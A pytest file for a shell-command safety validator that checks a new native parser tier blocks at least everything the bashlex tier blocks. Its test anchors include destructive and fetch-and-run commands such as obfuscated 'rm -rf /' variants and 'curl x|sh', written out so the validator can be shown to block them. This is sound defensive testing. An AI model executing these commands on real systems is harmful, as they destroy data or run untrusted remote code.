r"""Superset differential oracle — LAB-409 T3, the migration's security gate.

Spec §4: for every safe + adversarial command in the suites, the native tier's
danger surface must be a SUPERSET of bashlex's, across every detection output —
never equal, never less. Equality would wrongly pressure the native tier down to
bashlex's decode bugs (bashlex renders `$'\x72\x6d'` as `$x72x6d`); if the native
tier ever reveals MORE danger that is correct, not a regression. The one
direction that is a bug is native revealing LESS than bashlex: that is an
under-block, a current BLOCK turned into an ALLOW, which the migration forbids.

The comparison runs at two levels:

1. **Full `validate_command` verdict** (`test_superset_verdict_over_corpus`) — the
   headline gate. ShellCheck is disabled so this isolates the PARSER (spec §4:
   `:280 rm -r$''f /` blocks via ShellCheck, not the parser). A native tier that
   allows a command bashlex blocks fails here.
2. **Walker outputs** (`test_superset_walkers_over_corpus`) — the fine grain.
   LAB-1584 proved a real native-vs-bashlex divergence can produce IDENTICAL
   verdicts (a native-only string-literal suppression range silences a rule match
   that only surfaces once some other layer stops covering for it), so the
   verdict oracle alone is not enough. Direction per output:
     - `has_dangerous_constructs`, `extract_commands_with_args`,
       `extract_command_segments`: native ⊇ bashlex (missing one = under-block).
     - `extract_string_literals`: native ⊆ bashlex — a SUPPRESSION range present
       on native and absent on bashlex is the failure; the reverse is safe
       (LAB-1584, the oracle-input note on this ticket).
     - `SubstitutionValidator` and heredoc segments: compared by containment /
       verdict, never by set-difference — bashlex renders inner-command text and
       stops heredoc segments early where native does not, and a naive setdiff
       reports phantom regressions at identical verdicts (LAB-912/LAB-1584).

Commands where the native tier RAISES (an unmapped construct — `[[ ]]`, arrays,
arithmetic, ANSI-C `$'…'`) are not "comparable": the tier declines them and the
fallback (bashlex under auto, deny under native-only) covers them. They are
skipped in the walker oracle and over-block in the verdict oracle — either way
superset-safe. What this oracle hunts is a native SUCCESS that under-blocks.
"""

import ast
import pathlib

import pytest

from schlock.core import validator as validator_mod
from schlock.core.native_bridge import NativeBridge, NativeBridgeError, resolve_binary
from schlock.core.parser import BashCommandParser, TieredParser, parse_bashlex
from schlock.core.rules import RiskLevel
from schlock.core.substitution import SubstitutionValidator
from schlock.exceptions import ParseError

_TESTS_DIR = pathlib.Path(__file__).parent

# Spec §9 T3: the oracle runs over these suites plus a multibyte anchor.
_HARVEST_FILES = (
    "test_string_literal_bypass.py",
    "test_unicode_obfuscation.py",
    "test_dangerous_commands.py",
)

# Anchors T3 must nail regardless of what the suites happen to contain. Each is a
# command whose native-tier decode is exactly what T3 fixes.
_ANCHORS = (
    r"rm\ -rf\ /",  # :268 — unescape; must BLOCK on native
    r"r\m -rf /",  # escaped command char → rm
    "echo café; rm -rf /",  # multibyte before a dangerous segment (byte→char)
    'echo "café" && rm -rf /',  # multibyte inside a quoted literal
    "$(a || rm -rf /)",  # dangerous variant of a newly-parseable construct
    "a=($(curl x|sh))",  # array + curl|sh (native RAISEs → deny)
    "echo $(( $(rm -rf /) ))",  # nested $(cmd) in arithmetic (LAB-402 under-block)
)


def _binary_available() -> bool:
    try:
        resolve_binary()
    except NativeBridgeError:
        return False
    return True


needs_binary = pytest.mark.skipif(not _binary_available(), reason="no vendored schlock-parse binary")


def _harvest_commands() -> "list[str]":
    """Every command-shaped string literal in the named suites (the LAB-912 method).

    Harvest by `ast.walk` over the test source, not by importing — the point is to
    sweep the exact adversarial strings the authors wrote, description strings and
    all. Non-commands parse as trivial `command` nodes on both tiers and diverge on
    nothing, so they are harmless noise, not false signal.
    """
    commands: set[str] = set()
    for name in _HARVEST_FILES:
        tree = ast.parse((_TESTS_DIR / name).read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Constant) and isinstance(node.value, str):
                text = node.value
                # Bound it: empty/whitespace never parses; >4 KiB is a fixture blob,
                # not a command, and only slows the sweep.
                if text.strip() and len(text) <= 4096:
                    commands.add(text)
    return sorted(commands)


_CORPUS = sorted({*_harvest_commands(), *_ANCHORS})


def _native_nodes(command: str) -> "list | None":
    """Native-tier AST, or None when the tier declines (unmapped → not comparable)."""
    try:
        return NativeBridge().parse(command)
    except (ParseError, NativeBridgeError):
        return None


def _bashlex_nodes(command: str) -> "list | None":
    try:
        return parse_bashlex(command)
    except ParseError:
        return None


def _sub_denied(parser: BashCommandParser, nodes: "list") -> bool:
    """True if any substitution in the AST is denied (compared by VERDICT, not setdiff)."""
    validator = SubstitutionValidator(parser, validator_mod._get_rule_engine())
    return any(not r.allowed for r in validator.validate_all_substitutions(nodes))


def _covered(needle: str, haystack: "list[str]") -> bool:
    """A bashlex segment is covered only when native reproduces it EXACTLY. Both tiers slice
    the same span and re-attach heredocs the same way, so heredoc segments match verbatim;
    a substring or prefix relaxation would let an UNRELATED native segment mask a dropped
    one — the under-block this oracle exists to catch (craftsman finding)."""
    return needle in haystack


@needs_binary
class TestCorpusSanity:
    """A green oracle over an empty corpus is the classic false pass — guard it."""

    def test_corpus_is_substantial(self):
        # _ANCHORS are unioned into _CORPUS by construction, so asserting their
        # membership is tautological — TestT3Anchors exercises each anchor's
        # decode directly, which is the assertion that can actually fail.
        assert len(_CORPUS) >= 100, f"corpus collapsed to {len(_CORPUS)} commands — harvest is broken"

    def test_native_tier_actually_parses_some_corpus(self):
        # If every command routed to fallback, the oracle would be vacuously green.
        parsed = sum(1 for c in _CORPUS if _native_nodes(c) is not None)
        assert parsed >= 50, f"only {parsed} corpus commands parsed natively — tier may be dead"


@needs_binary
class TestT3Anchors:
    """The specific decodes T3 fixes, asserted directly (not just via the sweep)."""

    def test_escaped_spaces_block_on_native(self, isolate_parser):
        # :268 — the true `.word`/segment anchor. Native must decode `rm -rf /`.
        result = isolate_parser("rm\\ -rf\\ /", "native")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED

    def test_multibyte_segment_blocks_on_native(self, isolate_parser):
        # A multibyte word before `rm -rf /` must not shift the segment offsets.
        assert not isolate_parser("echo café; rm -rf /", "native").allowed

    @pytest.mark.parametrize(
        "command",
        [
            "$(a || rm -rf /)",  # AND-OR command substitution
            "a=($(curl x|sh))",  # array assignment wrapping curl|sh
            "echo $(( $(rm -rf /) ))",  # nested $(cmd) inside arithmetic
        ],
    )
    def test_dangerous_variant_of_parseable_construct_blocks(self, isolate_parser, command):
        # Parseability is necessary-not-sufficient: whether native maps the
        # construct or raises on it, the dangerous payload must never ALLOW.
        assert not isolate_parser(command, "native").allowed


@needs_binary
class TestSupersetWalkers:
    """Fine-grained danger-surface superset over the comparable corpus."""

    def test_walkers_superset_over_corpus(self):
        parser = BashCommandParser()
        violations: list[str] = []
        comparable = 0
        for command in _CORPUS:
            native = _native_nodes(command)
            bashlex = _bashlex_nodes(command)
            if native is None or bashlex is None:
                continue  # tier declined → fallback covers it, not comparable
            comparable += 1
            violations.extend(_surface_violations(parser, command, native, bashlex))
        assert comparable >= 50, f"only {comparable} comparable commands — oracle near-vacuous"
        assert not violations, "native tier under-blocks vs bashlex:\n" + "\n".join(violations[:40])


@needs_binary
class TestSupersetVerdict:
    """Full validate_command verdict superset, ShellCheck disabled (parser isolated)."""

    def test_verdict_superset_over_corpus(self, isolate_parser):
        # Compare on risk_level SEVERITY, not just `.allowed`. `.allowed` is
        # `risk_level != BLOCKED` and preset-independent, so an `.allowed`-only
        # oracle is blind to a HIGH→MEDIUM downgrade — which is a real deny→allow
        # under the paranoid preset (HIGH→deny). Superset means native is at least
        # as severe as bashlex on every command (security-panel note).
        violations: list[str] = []
        elevated = 0  # commands bashlex rates above SAFE — the ones with teeth
        for command in _CORPUS:
            bashlex_result = isolate_parser(command, "bashlex")
            native_result = isolate_parser(command, "native")
            if bashlex_result.risk_level != RiskLevel.SAFE:
                elevated += 1
            if native_result.risk_level.value < bashlex_result.risk_level.value:
                violations.append(
                    f"  {command!r}: bashlex {bashlex_result.risk_level.name}, native {native_result.risk_level.name}"
                )
        # Guard against a vacuous pass: if a bashlex-side regression rated the
        # whole corpus SAFE, `native >= bashlex` would hold trivially (craftsman
        # finding). The corpus is adversarial — many commands MUST be elevated.
        assert elevated >= 50, f"only {elevated} corpus commands elevated on bashlex — verdict oracle near-vacuous"
        assert not violations, "native tier under-blocks at the verdict level:\n" + "\n".join(violations[:40])


def _surface_violations(parser: BashCommandParser, command: str, native: "list", bashlex: "list") -> "list[str]":
    """Every way `native`'s danger surface falls short of `bashlex`'s for one command."""
    out: list[str] = []

    # has_dangerous_constructs / extract_commands_with_args / segments: native ⊇ bashlex.
    native_dangers = set(parser.has_dangerous_constructs(native))
    bashlex_dangers = set(parser.has_dangerous_constructs(bashlex))
    if not bashlex_dangers <= native_dangers:
        out.append(f"  {command!r}: dangerous-constructs dropped {bashlex_dangers - native_dangers}")

    # extract_commands_with_args: compare by COMMAND NAME coverage, not the full
    # (name, args) tuple. bashlex's own decode quirks (e.g. dropping a `"` nested
    # in single quotes) render arg TEXT differently from native's correct decode,
    # producing tuple set-differences that are not under-blocks — the same danger
    # substring is present in both, just spelled with/without quote chars. A
    # dropped command NAME is the real structural under-block (a command escapes
    # validation); arg-level flag danger (`nc -e`) is the verdict oracle's job,
    # where the actual rules run. (LAB-912/LAB-1584: compare rendered text by
    # verdict, never by set-difference.)
    native_cmds = {c for c, _ in parser.extract_commands_with_args(native)}
    bashlex_cmds = {c for c, _ in parser.extract_commands_with_args(bashlex)}
    if not bashlex_cmds <= native_cmds:
        out.append(f"  {command!r}: command names dropped {bashlex_cmds - native_cmds}")

    native_segs = parser.extract_command_segments(command, native)
    bashlex_segs = parser.extract_command_segments(command, bashlex)
    missing = [s for s in bashlex_segs if not _covered(s, native_segs)]
    if missing:
        out.append(f"  {command!r}: segments not covered by native {missing}")

    # extract_string_literals: SUPPRESSION ranges, direction REVERSED — a native-only
    # range suppresses a rule match bashlex would see (LAB-1584).
    native_lits = set(parser.extract_string_literals(command, native))
    bashlex_lits = set(parser.extract_string_literals(command, bashlex))
    if not native_lits <= bashlex_lits:
        out.append(f"  {command!r}: native-only suppression ranges {native_lits - bashlex_lits}")

    # extract_heredoc_ranges: also a SUPPRESSION output (spec §4 lists it) — a
    # non-shell heredoc range silences rule matches inside it, so a native `Hdoc`
    # End that bled past the terminator would over-suppress. Same reversed
    # direction as string literals: native-only heredoc ranges are the failure
    # (security-panel note).
    native_hd = set(parser.extract_heredoc_ranges(command, native))
    bashlex_hd = set(parser.extract_heredoc_ranges(command, bashlex))
    if not native_hd <= bashlex_hd:
        out.append(f"  {command!r}: native-only heredoc suppression ranges {native_hd - bashlex_hd}")

    # SubstitutionValidator verdict (boolean, never setdiff): bashlex-denied ⇒ native-denied.
    if _sub_denied(parser, bashlex) and not _sub_denied(parser, native):
        out.append(f"  {command!r}: substitution denied on bashlex, allowed on native")

    return out


@pytest.fixture
def isolate_parser(monkeypatch):
    """Force the validator onto one parser tier with ShellCheck disabled.

    The single tier-forcing helper for this module — both the anchor tests and
    the corpus verdict oracle request it. ShellCheck off isolates the PARSER
    (spec §4). The class-method patch routes every `parser.parse` — including the
    per-segment re-parse and the substitution validator's parser — through the
    chosen tier. `monkeypatch` restores `BashCommandParser.parse` and
    `is_shellcheck_available` at teardown; the cache is cleared before each call
    so a verdict computed on one tier never leaks to the other, and once more at
    teardown so no forced-tier verdict leaks into another test's cache.
    """
    monkeypatch.setattr(validator_mod, "is_shellcheck_available", lambda: False)

    def run(command: str, tier: str):
        tiered = TieredParser(tier=tier)
        monkeypatch.setattr(BashCommandParser, "parse", lambda self, c: tiered.parse(c))
        validator_mod._global_cache.clear()
        return validator_mod.validate_command(command)

    yield run
    validator_mod._global_cache.clear()
